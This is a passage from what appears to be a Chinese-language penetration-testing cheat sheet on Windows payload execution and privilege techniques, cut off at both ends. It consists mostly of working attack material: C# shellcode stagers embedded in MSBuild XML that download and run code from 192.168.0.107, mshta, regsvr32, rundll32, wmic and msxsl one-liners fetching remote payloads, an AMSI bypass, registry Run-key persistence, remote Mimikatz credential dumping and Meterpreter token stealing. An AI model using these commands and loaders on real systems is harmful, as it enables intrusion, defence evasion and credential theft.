class-name">IntPtr</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> uQgiOlrrBaR<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> BxkWKqEKnp<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> lelfRubuprxr<span class="token punctuation">,</span> <span class="token class-name">IntPtr</span> qPzVKjdiF<span class="token punctuation">,</span><span class="token class-name">UInt32</span> kNXJcS<span class="token punctuation">,</span> <span class="token keyword">ref</span> <span class="token class-name">UInt32</span> atiLJcRPnhfyGvp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> XSjyzoKzGmuIOcD<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> VumUGj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token function">HMSjEXjuIzkkmo</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> aCWWUttzmy<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">int</span></span> iJGvqiEDGLhjr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token class-name">IPEndPoint</span> YUXVAnzAurxH <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>aCWWUttzmy<span class="token punctuation">)</span><span class="token punctuation">,</span>iJGvqiEDGLhjr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">Socket</span> MXCEuiuRIWgOYze <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">try</span> <span class="token punctuation">&#123;</span> MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>YUXVAnzAurxH<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> Bjpvhc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>Bjpvhc<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token keyword">int</span></span> IETFBI <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>Bjpvhc<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> ZKSAAFwxgSDnTW <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span>IETFBI <span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name"><span class="token keyword">int</span></span> JFPJLlk <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>JFPJLlk <span class="token operator">&lt;</span> IETFBI<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> JFPJLlk <span class="token operator">+=</span> MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>ZKSAAFwxgSDnTW<span class="token punctuation">,</span> JFPJLlk <span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">(</span>IETFBI <span class="token operator">-</span> JFPJLlk<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">4096</span> <span class="token punctuation">?</span> <span class="token punctuation">(</span>IETFBI <span class="token operator">-</span> JFPJLlk<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">4096</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> nXRztzNVwPavq <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>MXCEuiuRIWgOYze<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span><span class="token punctuation">;</span>Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>nXRztzNVwPavq<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> ZKSAAFwxgSDnTW<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ZKSAAFwxgSDnTW<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xBF</span><span class="token punctuation">;</span><span class="token keyword">return</span> ZKSAAFwxgSDnTW<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">TOdKEwPYRUgJly</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> KNCtlJWAmlqJ<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>KNCtlJWAmlqJ <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">UInt32</span> uuKxFZFwog <span class="token operator">=</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token number">0x00040000</span><span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">UInt32</span> sDPjIMhJIOAlwn <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>uuKxFZFwog<span class="token punctuation">,</span><span class="token number">0x00000008</span><span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>sDPjIMhJIOAlwn<span class="token punctuation">,</span> KNCtlJWAmlqJ<span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>KNCtlJWAmlqJ<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">UInt32</span> ijifOEfllRl <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">IntPtr</span> ihXuoEirmz <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> sDPjIMhJIOAlwn<span class="token punctuation">,</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">ref</span> ijifOEfllRl<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>ihXuoEirmz<span class="token punctuation">,</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> ZKSAAFwxgSDnTW <span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span> ZKSAAFwxgSDnTW <span class="token operator">=</span> <span class="token function">HMSjEXjuIzkkmo</span><span class="token punctuation">(</span><span class="token string">"192.168.0.107"</span><span class="token punctuation">,</span><span class="token number">12138</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">TOdKEwPYRUgJly</span><span class="token punctuation">(</span>ZKSAAFwxgSDnTW<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Msbuild"><a href="#Msbuild" class="headerlink" title="Msbuild"></a>Msbuild</h4><pre><code>https://gitee.com/RichChigga/msbuild-execMSF监听&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 1.xml</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Project</span> <span class="token attr-name">ToolsVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.microsoft.com/developer/msbuild/2003<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Target</span> <span class="token attr-name">Name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iJEKHyTEjyCU<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xUokfh</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Target</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UsingTask</span><span class="token attr-name">TaskName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xUokfh<span class="token punctuation">"</span></span><span class="token attr-name">TaskFactory</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CodeTaskFactory<span class="token punctuation">"</span></span><span class="token attr-name">AssemblyFile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Task</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Code</span> <span class="token attr-name">Type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Class<span class="token punctuation">"</span></span> <span class="token attr-name">Language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;public class xUokfh : Task, ITask &#123;[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 ogephG,UInt32 fZZrvQ, UInt32 nDfrBaiPvDyeP, UInt32 LWITkrW);[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 qEVoJxknom, UInt32 gZyJBJWYQsnXkWe, UInt32 jyIPELfKQYEVZM,IntPtr adztSLHGJiurGO, UInt32 vjSCprCJ, ref UInt32 KbPukprMQXUp);[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr wVCIQGmqjONiM, UInt32 DFgVrE);static byte[] VYcZlUehuq(string IJBRrBqhigjGAx, int XBUCexXIrGIEpe) &#123;IPEndPoint DRHsPzS = new IPEndPoint(IPAddress.Parse(IJBRrBqhigjGAx),XBUCexXIrGIEpe);Socket zCoDOd = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);try &#123; zCoDOd.Connect(DRHsPzS); &#125;catch &#123; return null;&#125;byte[] OCrGofbbWRVsFEl = new byte[4];zCoDOd.Receive(OCrGofbbWRVsFEl, 4, 0);int auQJTjyxYw = BitConverter.ToInt32(OCrGofbbWRVsFEl, 0);byte[] MlhacMDOKUAfvMX = new byte[auQJTjyxYw + 5];int GFtbdD = 0;while (GFtbdD &lt; auQJTjyxYw)&#123; GFtbdD += zCoDOd.Receive(MlhacMDOKUAfvMX, GFtbdD + 5, (auQJTjyxYw -GFtbdD) &lt; 4096 ? (auQJTjyxYw - GFtbdD) : 4096, 0);&#125;byte[] YqBRpsmDUT = BitConverter.GetBytes((int)zCoDOd.Handle);Array.Copy(YqBRpsmDUT, 0, MlhacMDOKUAfvMX, 1, 4); MlhacMDOKUAfvMX[0]= 0xBF;return MlhacMDOKUAfvMX;&#125;static void NkoqFHncrcX(byte[] qLAvbAtan) &#123;if (qLAvbAtan != null) &#123;UInt32 jrYMBRkOAnqTqx = VirtualAlloc(0, (UInt32)qLAvbAtan.Length, 0x1000, 0x40);Marshal.Copy(qLAvbAtan, 0, (IntPtr)(jrYMBRkOAnqTqx),qLAvbAtan.Length);IntPtr WCUZoviZi = IntPtr.Zero;UInt32 JhtJOypMKo = 0;IntPtr UxebOmhhPw = IntPtr.Zero;WCUZoviZi = CreateThread(0, 0, jrYMBRkOAnqTqx, UxebOmhhPw, 0, ref JhtJOypMKo);WaitForSingleObject(WCUZoviZi, 0xFFFFFFFF); &#125;&#125;public override bool Execute()&#123;byte[] uABVbNXmhr = null; uABVbNXmhr = VYcZlUehuq("192.168.0.107",12138);NkoqFHncrcX(uABVbNXmhr);return true; &#125; &#125;]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Task</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UsingTask</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Project</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Winrm"><a href="#Winrm" class="headerlink" title="Winrm"></a>Winrm</h4><pre><code>MSF监听</code></pre><p><img src="./img/131.png" alt="image"></p><pre><code>&gt;mkdir winrm&gt;copy c:\Windows\System32\cscript.exe winrm创建文件WsmPty.xsl复制payload进去</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stylesheet</span><span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/XSL/Transform<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ms</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:xslt<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xmlns:</span>user</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span><span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ms:</span>script</span> <span class="token attr-name">implements-prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token cdata">&lt;![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("cmd"); ]]></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ms:</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stylesheet</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./img/132.png" alt="image"></p><pre><code>执行&gt;cscript.exe //nologo C:\Windows\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty</code></pre><p><img src="./img/133.png" alt="image"></p><h4 id="Mshta-1"><a href="#Mshta-1" class="headerlink" title="Mshta"></a>Mshta</h4><pre><code>&gt;use exploit/windows/misc/hta_server&gt;set srvhost 192.168.0.107&gt;mshta http://192.168.0.107:8080/RgNeCv.hta</code></pre><p><img src="./img/134.png" alt="image"></p><pre><code>执行vb    &gt;mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)Js    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;Jsrat    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;</code></pre><h4 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h4><pre><code>上线Empire&gt;usestager windows/launcher_sct生成sct文件放入web目录&gt;regsvr32 /s /n /u /i:http://192.168.0.107:8080/launcher.sct scrobj.dll&gt;cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://192.168.0.107/test.sct</code></pre><h4 id="Rundll32"><a href="#Rundll32" class="headerlink" title="Rundll32"></a>Rundll32</h4><h5 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h5><pre><code>&gt;rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe&gt;rundll32 url.dll, OpenURLA file://c:\windows\system32\calc.exe&gt;rundll32 url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e&gt;rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e&gt;rundll32 url.dll, FileProtocolHandler calc.exe</code></pre><h5 id="无弹窗执行"><a href="#无弹窗执行" class="headerlink" title="无弹窗执行"></a>无弹窗执行</h5><pre><code>&gt;rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:/Windows/System32/mshta.exe http://192.168.0.107:8080/SU8Fd6kNRz0.hta&quot;,0,true);self.close();</code></pre><h5 id="增删注册表"><a href="#增删注册表" class="headerlink" title="增删注册表"></a>增删注册表</h5><pre><code>保存为.inf文件&gt;rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf[Version]Signature=&quot;$WINDOWS NT$&quot;[DefaultInstall]AddReg=AddRegDelReg=DelReg[AddReg] #删除DelReg删掉红色部分执行HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,SYSTEM,0x00000000,c:/windows/temp/sv.exe0x00010001表示REG_DWORD数据类型，0x00000000或省略该项(保留逗号)表示REG_SZ(字符串)</code></pre><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><pre><code>&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\Temp\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close();</code></pre><h5 id="Out-RundllCommand"><a href="#Out-RundllCommand" class="headerlink" title="Out-RundllCommand"></a>Out-RundllCommand</h5><pre><code>使用nishang脚本Out-RundllCommand生成rundll代码&gt;powershell -nop -w h -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Execution/Out-RundllCommand.ps1&#39;); Out-RundllCommand -Reverse -IPAddress 192.168.0.107 -Port 12345&quot;</code></pre><p><img src="./img/135.png" alt="image"><br><img src="./img/136.png" alt="image"></p><pre><code>注：低版本powershell，隐藏窗口只识别-w hidden，高版本可以-w h执行远程PS脚本&gt;Out-RundllCommand -PayloadURL http://192.168.0.107/Invoke-PowerShellUdp.ps1 -Arguments &quot;Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.107 -Port 12138&quot;上线MSF生成psh-reflection格式脚本&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();r=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;powershell -w hidden -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/xx.ps1&#39;));&quot;,0,true);</code></pre><h4 id="DotNetToJScript"><a href="#DotNetToJScript" class="headerlink" title="DotNetToJScript"></a>DotNetToJScript</h4><pre><code>通过js/vbs执行.net程序https://github.com/tyranid/DotNetToJScript/releases&gt;DotNetToJScript.exe -o 1.js ExampleAssembly.dll 生成js&gt;DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll生成vbs&gt;DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll 生成vba&gt;DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll生成sct</code></pre><h5 id="StarFighters"><a href="#StarFighters" class="headerlink" title="StarFighters"></a>StarFighters</h5><pre><code>https://github.com/Cn33liz/StarFighters 可以执行powershell代码，详见执行单条命令$code = &#39;start calc.exe&#39;$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);$encoded = [System.Convert]::ToBase64String($bytes)$encoded复制为var EncodedPayload的值远程执行mimikatzpowershell IEX &quot;(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -Command &#39;log privilege::debug sekurlsa::logonpasswords&#39;&quot;以上保存在code.txt$code = Get-Content -Path code.txt$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);$encoded = [System.Convert]::ToBase64String($bytes)$encoded | Out-File 2.txt</code></pre><p><img src="./img/137.png" alt="image"></p><pre><code>生成的2.txt文件内容替换为var EncodedPayload的值再执行</code></pre><p><img src="./img/138.png" alt="image"><br><img src="./img/139.png" alt="image"></p><h5 id="绕过AMSI执行"><a href="#绕过AMSI执行" class="headerlink" title="绕过AMSI执行"></a>绕过AMSI执行</h5><pre><code>&gt;copy c:\windows\system32\cscript.exe amsi.dll&gt;amsi.dll evil.js</code></pre><h4 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h4><pre><code>Empire建立监听，生成windows/launcher_xsl模块的xsl文件保存在web目录&gt;wmic process get brief /format:http://192.168.0.107:8080/launcher.xsl也可结合mshta使用</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stylesheet</span><span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/XSL/Transform<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ms</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:xslt<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xmlns:</span>user</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span><span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ms:</span>script</span> <span class="token attr-name">implements-prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[var r = new ActiveXObject("WScript.Shell").Run("mshta http://192.168.0.107:8080/RgNeCv.hta");]]></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ms:</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stylesheet</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Msxsl"><a href="#Msxsl" class="headerlink" title="Msxsl"></a>Msxsl</h4><pre><code>下载https://www.microsoft.com/en-us/download/details.aspx?id=21714远程执行shellcodehttps://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml&gt;msxls.exe http://192.168.0.107/shellcode.xml http://192.168.0.107/shellcode.xmlEmpire生成shellcode贴到脚本中EncodedPayload位置</code></pre><p><img src="./img/140.png" alt="image"></p><h4 id="CPL"><a href="#CPL" class="headerlink" title="CPL"></a>CPL</h4><pre><code>Kali监听</code></pre><p><img src="./img/141.png" alt="image"></p><pre><code>编译成DLL</code></pre><p><img src="./img/142.png" alt="image"></p><pre><code>Control执行&gt;control C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll</code></pre><p><img src="./img/143.png" alt="image"></p><pre><code>或将DLL后缀改为cpl，双击执行，或rundll32执行&gt;rundll32.exe shell32.dll,Control_RunDLL C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll</code></pre><h3 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h3><pre><code>#use exploit/windows/local/ask</code></pre><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h4><pre><code>Meterpreter&gt;use incognitoMeterpreter&gt;list_tokens -uMeterpreter&gt;impersonate_token name\\administrator&amp;Meterpreter&gt;psMeterpreter&gt;steal_token pid</code></pre><h4 id="Cobalt-strike"><a href="#Cobalt-strike" class="headerlink" title="Cobalt strike"></a>Cobalt 